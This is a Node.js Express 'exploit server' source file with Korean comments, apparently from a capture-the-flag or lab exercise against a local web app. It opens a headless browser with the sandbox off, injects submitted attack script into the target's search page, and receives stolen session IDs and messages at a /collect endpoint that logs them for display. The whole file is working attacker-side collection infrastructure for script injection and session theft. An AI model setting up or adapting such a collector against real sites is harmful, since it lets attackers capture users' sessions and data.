// exploit/exploit_server.js

import express from "express";
import bodyParser from "body-parser";
import puppeteer from "puppeteer";
import path from "path";
import { fileURLToPath } from "url";
import cors from "cors";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors({
    origin: ["http://localhost:727", "http://localhost:777"],
    credentials: true
}));

const logs = [];

app.all("/collect", (req, res) => {
    const msg = (req.query.msg || req.body.msg || "").toString();
    const sessionid = (req.body.sessionid || "").toString();
    console.log("[COLLECT]", { sessionid, msg });
    logs.push({ ts: Date.now(), sessionid, msg });
    res.status(200).send("OK");
});

app.post("/visit", async (req, res) => {
    const { exploitScript } = req.body;
    // sessionid는 이제 exploitScript 내에서 획득되므로 받지 않습니다.
    if (!exploitScript) return res.status(400).json({ error: "missing payload" });

    console.log("Payload received");

    let browser;
    try {
        browser = await puppeteer.launch({ headless: "new", args: ["--no-sandbox", "--disable-dev-shm-usage"] });
        const ctx = await browser.createIncognitoBrowserContext();
        const page = await ctx.newPage();
        page.setDefaultNavigationTimeout(20000);

        // search 페이지로 직접 이동합니다.
        await page.goto(`http://localhost:727/search`, { waitUntil: "domcontentloaded" });

        // 익스플로잇 스크립트를 페이지에 주입하여 실행합니다.
        await page.evaluate((script) => {
            const el = document.createElement("script");
            el.type = "text/javascript";
            el.textContent = script;
            document.body.appendChild(el);
        }, exploitScript);

        await page.waitForResponse(res => res.url().includes("/collect") && res.status() === 200, { timeout: 20000 });
        await ctx.close();
        await browser.close();

        return res.json({ ok: true, hint: "GET /logs" });
    } catch (e) {
        try { if (browser) await browser.close(); } catch {}
        return res.status(500).json({ error: e.message || String(e) });
    }
});

app.get("/exploit", (req, res) => {
    res.sendFile(path.join(__dirname, "exploit.html"));
});

app.get("/exploit.js", (req, res) => {
    res.sendFile(path.join(__dirname, "exploit.js"));
});

app.get("/logs", (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
        <meta charset="utf-8"><title>Exploit Server Logs</title>
        </head>
        <body>
            <h2>Exploit Server Logs</h2>
            <pre>
            ${logs.map(item => `${new Date(item.ts).toISOString()} [${item.sessionid}] "${item.msg}"`).join("\n") || "No logs yet."}
            </pre>
            <button onclick="location.reload()">Reload</button>
        </body>
        </html>
    `);
});

app.listen(777, "0.0.0.0", () => console.log("Exploit server running on 777"));